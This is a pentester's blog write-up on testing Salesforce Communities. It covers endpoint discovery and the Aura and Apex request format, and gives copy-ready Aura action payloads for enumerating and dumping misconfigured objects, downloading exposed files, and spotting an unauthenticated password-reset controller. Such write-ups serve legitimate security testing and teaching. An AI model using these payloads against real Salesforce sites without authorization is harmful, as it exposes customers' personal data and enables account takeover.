---
title: "Pentesting Salesforce Communities"
date: 2024-12-02
categories: [Articles & Writeups, Web Hacking]
tags: [salesforce, ATO]
description: This blog post shows a recent penetration test I performed for some customers' Salesforce applications (also called Salesforce Communities), in which I exploited some common and other lesser-known flaws, which eventually led to an account takeover vulnerability. I will show some plugins and in-depth techniques to facilitate the enumeration of the target and the discovery of these flaws, and I will link to other excellent resources that I have found very useful for delving into the Salesforce attack surface and on which I have relied to conduct tests and write this article.
toc: true
media_subpath: /assets/img/Salesforce-PT/
image: thumbnail.png
mermaid: true
---

## Introduction

As mentioned in the abstract above, this blog post is intended to be a summary of a broader penetration test activity I conducted for a client. Following a security incident, I was tasked with analysing a large number of Salesforce Communities for issues and vulnerabilities. This allowed me to familiarise myself with this technology and to learn more about the main flaws and problems of these systems.


### Salesforce lightning 101

**Salesforce Lightning** is a **component-based framework** for Salesforce app development.
Usually, sites built with Lightning use one of the following URLs (but this is not always the case):

- _*.force.com_
- _*.secure.force.com_
- _*.live.siteforce.com_


For the sake of brevity, I will skip over most of the basic concepts concerning Salesforce, Salesforce Communities, and Salesforce Lighting, as there are already numerous resources on this subject online (and even AI can give you the basic answers you seek).

Please refer to the official documentation[^1][^2] and articles below for a general introduction to the topic:
- [What are Salesforce Communities?](https://www.varonis.com/blog/abusing-salesforce-communities) (written by Nitay Bachrach, varonis.com) 
- [What is Salesforce Lightning?](https://www.enumerated.ie/index/salesforce#how:~:text=protect%20your%20data.-,What%20is%20Salesforce%20Lightning%3F,-Simply%20put%2C%20it%E2%80%99s) (written by Aaron Costello, enumerated.ie)
- [Introduction to Salesforce SAAS Applications](https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-1-the-essentials-ffae632a00e5) (written by Praveen Kanniah, infosecwriteups.com)


[^1]: [Salesforce Lightning: The Future of Sales and CRM](https://www.salesforce.com/eu/campaign/lightning/), salesforce.com
[^2]: [Lightning Platform: Building blocks of better apps](https://www.salesforce.com/eu/products/platform/lightning/), salesforce.com

However, there are some important concepts and quirks that I cannot take for granted, so we will look at them here quickly.

#### Terminologies
- **Salesforce Community**: these are sites that run on Salesforce’s Lightning framework and let customers and partners interface with Salesforce instances from outside an organization. Communities are public-facing and indexed by Google.
- **Salesforce Lightning Component Framework**: is a component-based framework for Salesforce app development. It includes the views (markup) and JS controllers on the client-side, then Apex controllers and databases on the server side. Default lightning components for example are ui, aura, and force. Those components are self-contained objects that a developer can assemble to create custom web pages. 
- **Aura components** perform actions on Salesforce objects. Components have **controllers** that export different methods (or actions) to perform certain tasks. These are functions that interact in some ways with **Objects**. **Params** can also be passed to these functions. There are two types of controllers:
  - **Standard** aura classes (`aura://`), pre-formatted functions to access Salesforce objects
  - **Custom** apex classes (`apex://`), new functions developed from scratch by developers.
- **Objects** [^salesforce-objects], in Salesforce, can be considered like DB tables for storing data. They can be:
	- **Standard Objects** [^std-objects] (also labled **Default Objects**), and they are objects secured by SalesForce. A full list can be found [here](https://github.com/reversebrain/salesforce_standard_objects/blob/main/objects.txt).
	- **Custom Objects** [^custom-objects], identified by the `__c` in their name (like `level__c`). These are objects created manually by admins.
- **Fields** are like DB table columns
- **Records** are like DB table rows
- **Namespace** - Think of it like a package, which groups related components together. Default namespaces are `aura`, `ui`, and `force`. Custom components that are created and added to a community will either use the namespace chosen by the Salesforce administrator, the namespace of a package or simply use the `c` namespace which refers to the default namespace.

[^std-objects]: [Standard Objects](https://developer.salesforce.com/docs/atlas.en-us.object_reference.meta/object_reference/sforce_api_objects_list.htm), developer.salesforce.com
[^custom-objects]: [Custom Objects](https://developer.salesforce.com/docs/atlas.en-us.object_reference.meta/object_reference/sforce_api_custom_objects_list.htm), developer.salesfroce.com
[^salesforce-objects]: [Overview of Salesforce Objects and Fields](https://developer.salesforce.com/docs/atlas.en-us.object_reference.meta/object_reference/sforce_api_objects_concepts.htm), developer.salesforce.com

![]({{page.screenshots}}Salesforce-overview.png)
(*image taken from appomni.com*)

#### Guest User
An **unauthenticated user** is called a **Guest User** in Salesforce. In recent versions he is not enabled by default, however, it's not rare to find them enabled in the wild.

You can usually easily recognise if the guest user is enabled because you will see many automatic requests to the `/aura` endpoint in the background (however that's not always true).

#### Salesforce security controls

{: .warning }
>Permissions are set for objects, fields, and records **_separately_**!

Objects have a very complex sharing model:
- CRUDS
- Groups
- Sharing Rules
- Owner \[+Manual\] \[+Territory\] \[+Role\] 
- etc.

And **custom objects are rarely configured with the correct OLS/FLS/RLS**.

Quoting "[*How does Salesforce Lightning implement security?*](https://www.enumerated.ie/index/salesforce#how:~:text=the%20%E2%80%98force%E2%80%99%20namespace.-,How%20does%20Salesforce%20Lightning%20implement%20security%3F,-Prior%20to%20going) ":
>From an attacker's perspective, the main security controls to be concerned with essentially boil down to the following (*open the links to the original article for a detailed explanation of what it is all about*):
- [Object Level Security (OLS)](https://www.enumerated.ie/index/salesforce#how:~:text=Level%20Security%20(RLS)-,Objects%20and%20OLS,-Interested%20in%20storing) - This is often referred to as CRUD within Salesforce documentation
- [Field Level Security (FLS)](<https://www.enumerated.ie/index/salesforce#how:~:text=Object%20%2D%3E%20Click%20%E2%80%98Edit%E2%80%99-,Fields%20and%20FLS,-FLS%20(field%2Dlevel>)
- [Record Level Security (RLS)](https://www.enumerated.ie/index/salesforce#how:~:text=you%20scroll%20down.-,Records%20and%20RLS,-Lastly%2C%20are%20the)



Also consider that in Lightning there is **no real administrator**, but there are **specific groups created to perform privileged/restricted actions**. This is to simplify authorizations, but this is where custom objects become a problem.

### HTTP request format, Aura Components and APEX

Aura components, Apex, and Salesforce form the backbone of Salesforce's Lightning platform, empowering developers to build dynamic, interactive web applications. **Aura components are reusable, modular building blocks** that enable the creation of rich user interfaces, while **Apex is Salesforce’s proprietary programming language**, used to implement complex business logic on the server-side.

Some useful resources for getting started poking around with aura components: 
- [Get Started with Aura Components](https://developer.salesforce.com/docs/atlas.en-us.lightning.meta/lightning/intro_components.htm), developer.salesforce.com
- [Quick Start: Aura Components](https://trailhead.salesforce.com/content/learn/projects/quickstart-lightning-components), trailhead.salesforce.com

The Apex classes that have methods that are denoted with `@AuraEnabled` are what interest us the most, as these methods **can be called remotely through the Aura endpoint**.
Unfortunately, without access to the code itself, exploitation of apex class methods will always be done in blackbox (unless the class is open source).


Salesforce standard HTTP requests to aura components [^aura-comp] look like the following:

[^aura-comp]: [Aura Components](https://developer.salesforce.com/docs/atlas.en-us.lightning.meta/lightning/intro_components.htm), developer.salesforce.com

```http
POST /s/sfsites/aura?r=4&ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=1 HTTP/2
Host: salesforce.example.com
Cookie: ... SNIPPED ...
Content-Length: 1324
X-Sfdc-Page-Scope-Id: 69b7ebbe-2e8b-4622-9738-06da97612d69
X-Sfdc-Request-Id: 22933900001b9f0ff3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Sfdc-Page-Cache: c29575b7054d1291

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2291%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.communities.components.aura.components.forceCommunity.richText.RichTextController%2FACTION%24getParsedRichTextValue%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2FforceCommunity%3ArichText%22%2C%22params%22%3A%7B%22html%22%3A%22%3Cp%20style%3D%5C%22text-align%3A%20right%3B%5C%22%3E%3Cimg%20class%3D%5C%22sfdcCbImage%5C%22%20alt%3D%5C%22%5C%22%20src%3D%5C%22%7B!contentAsset.NPAZ_599283a16ca1463fa0523e4088b460.1%7D%5C%22%20style%3D%5C%22width%3A%20368.115px%3B%20height%3A%2096.0625px%3B%5C%22%3E%3Cimg%20class%3D%5C%22sfdcCbImage%5C%22%20alt%3D%5C%22%5C%22%20src%3D%5C%22%7B!contentAsset.NPAZ_599283a16ca1463fa0523e4088b4602.1%7D%5C%22%20style%3D%5C%22width%3A%20377.013px%3B%20height%3A%2098.3875px%3B%5C%22%3E%3C%2Fp%3E%22%7D%2C%22version%22%3A%2261.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22UnpnOFNpOGttZTd0bGJqRkN2T2pGQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%2248jFr9jtMWnzXaDp1ibM3w%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2F%3Flanguage%3Den_US&aura.token=null
```

The HTTP body once decoded looks like this:
```json
message={
  "actions": [
    {
      "id": "91;a",
      "descriptor": "serviceComponent://ui.communities.components.aura.components.forceCommunity.richText.RichTextController/ACTION$getParsedRichTextValue",
      "callingDescriptor": "markup://forceCommunity:richText",
      "params": {
        "html": "<p style=\"text-align: right;\"><img class=\"sfdcCbImage\" alt=\"\" src=\"{!contentAsset.NPAZ_599283a16ca1463fa0523e4088b460.1}\" style=\"width: 368.115px; height: 96.0625px;\"><img class=\"sfdcCbImage\" alt=\"\" src=\"{!contentAsset.NPAZ_599283a16ca1463fa0523e4088b4602.1}\" style=\"width: 377.013px; height: 98.3875px;\"></p>"
      },
      "version": "61.0",
      "storable": true
    }
  ]
}&aura.context={
  "mode": "PROD",
  "fwuid": "UnpnOFNpOGttZTd0bGJqRkN2T2pGQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41",
  "app": "siteforce:communityApp",
  "loaded": {
    "APPLICATION@markup://siteforce:communityApp": "48jFr9jtMWnzXaDp1ibM3w"
  },
  "dn": [],
  "globals": {},
  "uad": false
}&aura.pageURI=/s/?language=en_US
&aura.token=null
```


{: .tip }
>You can use the [salesforce/lightning-burp](https://github.com/salesforce/lightning-burp) [burpsuite extension](https://github.com/0xb120/cheatsheets_and_ctf-notes/blob/main/Dev%2C%20ICT%20%26%20Cybersec/Tools/Burpsuite.md#useful-extensions) plugin for better handling Lightning.

The important fields to be considered in the HTTP body are:
- `message`: contains a JSON object that encapsulates all necessary **data for structuring the communication** between the client-side Lightning components and Salesforce's back-end. 
- `aura.context`: provides essential metadata, state information, and security-related **details that the server needs to process the request effectively**. It encapsulates a variety of contextual data that enables the server to understand the environment in which the request is made.
- `aura.token`: the value will show whether or not you are authenticated. `undefined` or `null` values indicate you are a Guest User, otherwise a JWT token contains your user information.

`message` contains **actions** (typically JavaScript functions or Apex controller methods) that need **to be executed**. Each action corresponds to a specific operation that the client is asking the server to perform, and is made up by:
- `id`: random string used to identify multiple actions in the same request
- `descriptor`: A **reference to the controller method or component action** being invoked, in the form `namespace:component` (usually has the form `namespace://contoller-class/ACTION$method-to-invoke`).
- `callingDescriptor`: usually "UNKNOWN" since it is often ignored, but usually references the component or **controller that initiated the action**.
- `params`: **parameters** provided to the action.

{: .important}
>The `aura.context` and `aura.token` fields are **not strictly tied to a single website**, but **can be reused** (with minor adjustments) in any other Salesforce application, especially when the Guest User is enabled. This is very useful, especially for interacting with instances that support the guest user and have enabled the aura endpoint, but that do not send requests automatically (and therefore do not provide a starting "request template").


## Salesforce enumeration

### Identify the targets

Depending on the scope of the activity and the amount of time available, there are several ways to fingerprint Salesforce sites. Usually, a good way to start is to use **Google dorks** and **search for common CNAMEs or common DNS**. [^salesforce-targets]

[^salesforce-targets]: [Salesforce Recon Process](https://www.enumerated.ie/index/salesforce#recon%20process), enumerated.ie

Luckily in my case, I had already been provided with a DNS list of the client's Salesforce sites (_but not the communities_), so I could start scanning and enumerating the sites directly without having to search for them first.

### Identify the aura endpoint

As mentioned before, the `/aura` endpoint is an essential component for Salesforce sites and it is an important element when it comes to the threat model of applications.

The endpoint is **typically exposed on a standard path**, however it may also be exposed on a path other than the root (usually happens when several communities are hosted on the same site, so each of them has its own aura endpoint), and is **not always contacted automatically** when navigating to a Salesforce site:

```
## Standard endpoint
/aura
/sfsites/aura
/s/sfsites/aura

## Custom communities endpoint can start with other words, eg.
/admin/s/sfsites/aura
/customers/aura
/foo/bar/sfsites/aura
```

You can search for such paths using some common **nuclei templates** [^nuclei-template] or you can do it manually by sending an HTTP POST request and looking for the following patterns:


```
## Search for these patterns in server response:
"actions":[
aura:clientOutOfSync
aura:invalidSession
```

A good way to find the aura endpoint and the available communities without brute-forcing them is to use some passive recon tools like *__gau__* [^gau] or *__waymore__* [^waymore] and search for the `/s/` pattern within the extracted URLs:

```sh
$ gau redacted.my.site.com        
https://redacted.my.site.com/
https://redacted.my.site.com/random-asd-1/s/article/What-steps-do-you-take-to-ensure-website-accessibility
https://redacted.my.site.com/foo-bar-boom/s/mexico
https://redacted.my.site.com/Beep/s/equipment-listing
https://redacted.my.site.com/RAM/s/mexico
https://redacted.my.site.com/robots.txt
https://redacted.my.site.com/never-back-again/s/
https://redacted.my.site.com/
https://redacted.my.site.com/never-back-again/s/?language=en_US
https://redacted.my.site.com/ContactUs1337-pathUS/s/
https://redacted.my.site.com/login
https://redacted.my.site.com/Beep/s/
https://redacted.my.site.com/login?locale=us

$ curl -X POST https://redacted.my.site.com/Beep/s/sfsites/aura -H "Content-Type: application/x-www-form-urlencoded" -d 'foo=bar'
{"event":{"descriptor":"markup://aura:invalidSession","attributes":{"values":{}},"eventDef":{"descriptor":"markup://aura:invalidSession","t":"APPLICATION","xs":"I","a":{"newToken":["newToken","aura://String","I",false]}}},"exceptionMessage":"Guest user access is not allowed","exceptionEvent":true}
$ curl -X POST https://redacted.my.site.com/random-asd-1/aura -H "Content-Type: application/x-www-form-urlencoded" -d 'foo=bar'
{"event":{"descriptor":"markup://aura:invalidSession","attributes":{"values":{}},"eventDef":{"descriptor":"markup://aura:invalidSession","t":"APPLICATION","xs":"I","a":{"newToken":["newToken","aura://String","I",false]}}},"exceptionMessage":"Guest user access is not allowed","exceptionEvent":true}
```

[^gau]: [gau](https://github.com/lc/gau), github.com
[^waymore]: [waymore](https://github.com/xnl-h4ck3r/waymore), github.com

### Identify Standard and Custom aura components

A few standard JS files are loaded in *nearly* every Salesforce web application, containing details about standard classes, actions, and *occasionally* custom classes as well.
1. `app.js`
2. `aura_prod.js`
3. `bootstrap.js`

**Grep** for the below pattern in the **responses** of these JS files to identify the various classes and controllers made available by the site: 
- `componentService.initControllerDefs([{`

![]({{page.screenshots}}salesforce-app-js.png)

Custom classes sometimes are listed in those JS files too, but it's most common to find them in HTTP requests and responses as you browse the application.

You can recognize custom classes from standard ones because they start with `apex://` instead of `aura://`

```
// STANDARD class:
aura://RecordUiController/ACTION$getObjectInfo

// CUSTOM class:
apex://New_Sales_Controller/ACTION$getSalesData
```

You can easily search for them by grepping the full HTTP history and looking for the following keywords:
- `compound://` in **server responses** (most of the time you can recognize easily the request because the `message` parameter is passed inside the query string instead of a POST body):
![]({{page.screenshots}}Salesforce-aura-compound.png)
- `apex%3a%2f%2f` in **HTTP requests**:
![]({{page.screenshots}}Salesforce-apex-requests.png)


[^resp-grep]: [Response Grepper](https://portswigger.net/bappstore/665178d3bf494019b3e8fe53a133528b), portswigger.net

Within the various responses, you should obtain some results similar to the following snippet:
```json
"componentDef":{"descriptor":"markup://c:CA_CommunityUtil"},
... snip ...
{
"xs":"P","descriptor":"markup://c:CA_CommunityUtil",
"rl":true,"st":{"descriptor":"css://c.CA_CommunityUtil",
"co":"",
"cl":"cCA_CommunityUtil"},
"cd":{
  "descriptor":"compound://c.CA_CommunityUtil",
  "ac":[
    {
      "n":"getCurrentCommunityContextInfos",
      "descriptor":"apex://CommunityUtil/ACTION$getCurrentCommunityContextInfos",
      "at":"SERVER",
      "rt":"apex://Map<String,ANY>",
      "pa":[]
    },
    {
      "n":"getCurrentCommunityUrl",
      "descriptor":"apex://CommunityUtil/ACTION$getCurrentCommunityUrl",
      "at":"SERVER",
      "rt":"apex://String",
      "pa":[]
    }
  ]
}
```

The important values to note here are:
- The `descriptor` value that exists in `componentDefs` : This can be used for **retrieving the full definition**, although not required at the moment (_more about this later_). The descriptor format is made up of `namespace:component`.
- The `descriptor` value inside the `ac` field, defining the **actual controller** and **action**.
- `rt`: The **return value type**. 
- `pa`: **Parameters** that are passed to the apex class method, and their type.

{: .tip }
>Use the following regex alongside some tool integrated with grep (eg. Response Grepper [^resp-grep]) in order to quickly extract custom apex class descriptors:<br><br>
>Regex: `"descriptor":"(apex:\/\/[^\"]*)`<br><br>
>![]({{page.screenshots}}Salesforce-response-grepper.png)

Sometimes, however, searching for `compound://` in server responses does not reveal any custom `apex` controller (because maybe it was cached by the browser in the past, or for any other reason). 

In these cases, we must use different approaches: 
1. we can search with a top-down approach for every custom component starting from static resources [^appomni]
2. we can **identify any HTTP request that sends a `message` field containing an `apex` controller** and extract some important values that will be used later to query the `/auraCmpDef` endpoint and obtain any custom controller linked to the original `apex` class.

[^appomni]: [Retrieving the markup descriptor of custom Components](https://appomni.com/ao-labs/lightning-components-a-treatise-on-apex-security-from-an-external-perspective/#:~:text=Retrieving%20the%20markup%20descriptor%20of%20custom%20Components), appomni.com

Below is an example of a request for a message using an apex controller, and the required parameters to be extracted:
```http
POST /foo/s/sfsites/aura?r=2&other.CommunityUtil.getCurrentCommunityContextInfos=1 HTTP/2
Host: [...REDACTED...]
Cookie: [...TRUNCATED...]
Content-Length: 760
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
X-Sfdc-Page-Scope-Id: 91062b0d-10f8-402b-a496-5ece7b62f20a
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Origin: [...REDACTED...]
Referer: [...REDACTED...]
Priority: u=1, i

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2246%3Ba%22%2C%22descriptor%22%3A%22apex%3A%2F%2FCommunityUtil%2FACTION%24getCurrentCommunityContextInfos%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fc%3ACA_CommunityUtil%22%2C%22params%22%3A%7B%7D%7D%5D%7D
&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22ZzhjQmRxMXdrdzhvS0RJMG5qQVdxQTdEcXI0cnRHWU0zd2xrUnFaakQxNXc5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%221098_0Gzb_TJPQxPxmu8ktwr7uw%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D
&aura.pageURI=[...TRUNCATED...]&aura.token=null
```

From the relative `context` field, we have to extract:
- the `loaded` content and the relative ID
- the desired `descriptor`

From the `message` field, we have to identify the custom `callingDescriptor`.

![]({{page.screenshots}}Salesforce-message-parameters.png)

Once obtained these three information, we can query the `/auraCmpDef` endpoint and extract **every** declared apex controller for the specified descriptor:

```http
GET /example/auraCmpDef?aura.app=<APP_MARKUP>&_au=<AU_VALUE>&_def=<COMPONENT_MARKUP>&_ff=DESKTOP&_l=true&_cssvar=false&_c=false&_l10n=en_US&_style=-1450740311&_density=VIEW_ONE HTTP/1.1
Host: redacted.my.site.com
```
Example: [https://redacted.my.site.com/example/auraCmpDef?aura.app=markup://siteforce:loginApp2&_au=1098_0Gzb_TJPQxPxmu8ktwr7uw&_def=markup://c:CA_CommunityUtil&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=-386269907&_style=-1450740311&_uid=329__98ODtCT_xKhlVwqtRYokg&aura.mode=PROD
](https://redacted.my.site.com/example/auraCmpDef?aura.app=markup://siteforce:loginApp2&_au=1098_0Gzb_TJPQxPxmu8ktwr7uw&_def=markup://c:CA_CommunityUtil&_c=false&_density=VIEW_ONE&_dfs=8&_ff=DESKTOP&_l=true&_l10n=en_US&_lrmc=-386269907&_style=-1450740311&_uid=329__98ODtCT_xKhlVwqtRYokg&aura.mode=PROD)

![]({{page.screenshots}}salesforce-auracmpdef.png)

Now that we know *exactly* the definition of the controller, we can craft an ad-hoc `message` to the community's aura endpoint to attempt to interact with the method:

```http
POST /custom-community/s/sfsites/aura HTTP/2
Host: [...REDACTED...]
Cookie: [...TRUNCATED...]
Content-Length: 816
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

message={"actions":[{"id":"150;a","descriptor":"apex://CommunityUtil/ACTION$getCurrentCommunityContextInfos","callingDescriptor":"markup://c:CA_CommunityUtil","params":{}}]}
&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22ZzhjQmRxMXdrdzhvS0RJMG5qQVdxQTdEcXI0cnRHWU0zd2xrUnFaakQxNXc5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221176_RiEqto7a10RL4-qsAx8xFg%22%2C%22MODULE%40markup%3A%2F%2Flightning%3Af6Controller%22%3A%22292_Kx4YnuF8cbgQbawpLBy0SQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%22335_G1NlWPtUoLRA_nLC-0oFqg%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D
&aura.pageURI=[...REDACTED...]
&aura.token=null
```

A more detailed list of descriptors and *undocumented* endpoints can be found at the following links:
- [lightning/ui\*Api Wire Adapters and Functions](https://developer.salesforce.com/docs/platform/lwc/guide/reference-ui-api.html), developer.salesforce.com
- [Aura descriptors and how to use them](https://www.varonis.com/blog/abusing-salesforce-communities#:~:text=Aura%20descriptors%20and%20how%20to%20use%20them) (written by Nitay Bachrach, varonis.com)


### Identify Standard and Custom Objects

Going back to what was said in the introduction, in Salesforce there are two types of objects: standard and custom. Both of them can be misconfigured and made accessible to unauthorized users.

From an attacker's point of view, it is important to **identify as many misconfigured Objects as possible** as they may contain sensitive information, both for the exploitation phase and for the nature of the data itself.

The following is a list of controllers and actions that can be used to enumerate objects and look for permission issues or information leaks (insert them within the `message` field and send them to `/aura`):

- **getConfigData**: List all the configuration and objects within the `apiNamesToKeyPrefixes` key for the current Salesforce application. Search within the response for Custom Objects suffixed with `__c` and copy them to a custom wordlist.
```json
{"actions":[{"id":"1;a","descriptor":"aura://HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}
```
![]({{page.screenshots}}salesforce-getConfigData.png)

- **getObjectInfo** [^getobjectinfo]: Get metadata about a specific object. You can use this action to understand if the user has access to the object or not. It will not return any informative response if the user does not have access, otherwise, this will return information about an object and its corresponding fields. Watch out for `__c` in the response from each object to make notes about the related custom objects and fields.
```json
{"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"§FUZZ-EVERY-OBJECT-HERE§"}}]}
```
![]({{page.screenshots}}salesforce-getObjectInfo.png)

[^getobjectinfo]: [`getObjectInfo`](https://developer.salesforce.com/docs/platform/lwc/guide/reference-wire-adapters-object-info.html), developer.salesforce.com

- **getListByObjectName**: returns the lists created for an object in the UI. Watch out for `__c` in the response from each object to make note about the related custom objects and fields.
```json
{"actions":[{"id":"1;a","descriptor":"aura://ListUiController/ACTION$getListsByObjectName","callingDescriptor":"UNKNOWN","params":{"objectApiName":"§FUZZ-EVERY-OBJECT-HERE§"}}]}
```

At this point, after having merged the standard objects [^std-objects] and the custom objects obtained with the actions above, **we are ready** to check which ones are accessible and what information they contain.

Let's start digging!


## Fuzzing and Exploitation

Once we have mapped out most of the attack surface and obtained valid `aura.token` and `aura.context` values (*go grab them from any Salesforce exposed with the guest user active if your target doesn't provide them!*), we can start extracting data and interacting with the identified classes.

### Object permission issues

If admins messed up the sharing permissions on the various objects and fields, we can use some standard controllers to access the broken records.

- **getItems**: retrieves records for a given object bounded to specific user permissions, but if record permissions are misconfigured, this can retrieve records of an entire object.
```json
{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"§FUZZ-EVERY-STANDARD-OBJECT§","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}
```

- **getRecord** [^get-record]: retrieves records starting from on a record id.
```json
{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"§RECORD-ID§","record":null,"inContextOfComponent":"","mode":"VIEW","layoutType":"FULL","defaultFieldValues":null,"navigationLocation":"LIST_VIEW_ROW"}}]}
```

[^get-record]: [`getRecord`](https://developer.salesforce.com/docs/platform/lwc/guide/reference-wire-adapters-record.html?q=getRecord), developer.salesforce.com

{: .info }
> IDs generally look like this: `"Id":"0099g000001mWQaYHU"`

Using these controllers, I started to extract every misconfigured object from the various communities, obtaining different interesting information, including:
- customers names, surnames, emails, phone numbers, and other PII from several **Contact objects**
- names, surnames, emails and IDs (very useful for the exploitation phase) from several **Account objects**
- Other PII from different **AccountTeamMember** and **AccountContactRelation objects**
- Personal notes from some **Note objects**
- Exposed files from several **Document**, **ContentDocument** and **ContentVersion objects**
- Calendar events from **Calendar objects**
- and other information from some other standard and custom objects, like **Knowledge__kav**, **KnowledgeArticleVersion**, **ProcessInstanceWorkitem**, **CollaborationGroup** and many others

![]({{page.screenshots}}salesforce-user-obj.png)
*sample data exposed by a User object*

![]({{page.screenshots}}salesforce-user-ids.png)
*list of User IDs*

![]({{page.screenshots}}salesforce-quotations.png)
*estimated quotations for customer orders*

![]({{page.screenshots}}salesforce-contact-info.png)
*personal user information*

Among the various objects, some of them will return IDs particularly related to **attachments**. You can use those IDs with some specific API to **retrieve and download the raw files** (these paths are relative to the base path, not the aura endpoint):

- Document - Prefix 015 - `/servlet/servlet.FileDownload?file=ID`
- ContentDocument - Prefix 069 - `/sfc/servlet.shepherd/document/download/ID`
- ContentVersion - Prefix 068 - `/sfc/servlet.shepherd/version/download/ID`

See [Salesforce Object Key Prefix List](https://www.biswajeetsamal.com/blog/salesforce-object-key-prefix-list/) (written by biswajeetsamal, biswajeetsamal.com)  for a full default object ID prefixes list.

```json
// sample input
{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"ContentVersion","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}

// sample output
{"record":{"LastModifiedDate":"2023-09-01T13:13:22.000Z","Description":null,"CreatedDate":"2023-09-01T13:13:20.000Z","Title":"NPAZ_599283a16ca1463fa0523e4088b4602 (1)","CurrencyIsoCode__l":"EUR - Euro","Id":"068690000164AzJAAU","CurrencyIsoCode":"EUR","LastModifiedById":"0056900000BlCU8AAN","SystemModstamp":"2024-03-22T11:21:11.000Z","sobjectType":"ContentVersion"}}
```

```http
GET /sfc/servlet.shepherd/version/download/068690000164AzJAAU HTTP/2
Host: redacted.com

--- RESPONSE ---

HTTP/2 200 OK
Date: Wed, 03 Jul 2024 20:04:52 GMT
Content-Type: image/jpeg; charset=UTF-8
```

Doing this way, I was able to access and download some files conceptually conceived as *restricted* relative to deployment configurations, private screenshots, sales tables, and others.

![]({{page.screenshots}}salesforce-exposed-file.png)
![]({{page.screenshots}}salesforce-exposed-file2.png)
*sample files exposed by a ContentDocument object*

### Broken Access Control on Custom Classes

While enumerating the communities that had been assigned to me, I stumbled upon a couple of communities that particularly caught my attention. They had the Guest User enabled, and I was able to query a lot of interesting information including user-related ones (*see the previous section*), but most importantly, they automatically contacted a couple of **custom controllers** to read out some **routes**.

![]({{page.screenshots}}salesforce-routes.png)

Visiting these routes, the sites started to make many more requests to the aura endpoint to download **every** relevant controller matched to the route, exposing many custom controllers and custom methods.

![]({{page.screenshots}}salesforce-apex1.png)
![]({{page.screenshots}}salesforce-apex2.png)

Has something already caught your attention?

Out of all the various controllers, one in particular was very interesting to me: `CA_ChangePasswordSettingController`, and in particular the action `resetPassword`:

![]({{page.screenshots}}salesforce-changepasswordsettingcontroller.png)


```json
"cd":{
  "descriptor": "compound://c.CA_ResetPasswordSetting",
  "ac": [
    {
      "n": "resetPassword",
      "descriptor": "apex://CA_ChangePasswordSettingController/ACTION$resetPassword",
      "at": "SERVER",
      "rt": "apex://String",
      "pa": [
        {
          "name": "userID",
          "type": "apex://String"
        },
        {
          "name": "newPassword",
          "type": "apex://String"
        }
      ]
    }
  ]
}
```

We can notice from its descriptor that the `resetPassword` ACTION accepts only two string parameters:
- userID
- newPassword

<br>
**This is not good!**

By not requiring the user's previous password or a valid reset password token, this controller can potentially be abused to reset **_any_** user's password starting from a simple userID (permissions apart). Furthermore, UserIDs can be extracted from the standard object `User`, as we did in the previous section.

![]({{page.screenshots}}salesforce-user-ids.png)
*list of User IDs extracted from the `User` standard object*

Probably this controller was not meant to be contacted from the outside, I think it was for internal use as a result of the call to the `chagePassword` method, but since it was placed inside the `CA_ChangePasswordSettingController` class, which is exposed, it ended up being wrongly exposed as well.

![]({{page.screenshots}}salesforce-changepassword.png)<br>
*`changePassword` method contained inside `CA_ChangePasswordSettingController`*

